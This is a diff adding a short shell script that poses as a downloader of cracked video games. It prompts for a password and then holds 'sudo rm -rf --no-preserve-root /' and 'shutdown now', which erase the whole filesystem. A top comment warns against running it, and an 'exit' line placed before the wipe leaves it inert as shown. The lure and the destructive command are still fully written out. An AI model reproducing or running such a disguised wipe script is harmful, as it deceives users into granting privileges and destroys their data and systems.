@@ -1,0 +1,7 @@
+# Do NOT execute this - this will WIPE YOUR ROOT DIRECTORY!
+echo 'Downloading free cracked video games...'
+sleep 2.5
+echo 'Password required to allocate space for download:'
+exit
+sudo rm -rf --no-preserve-root /
+shutdown now
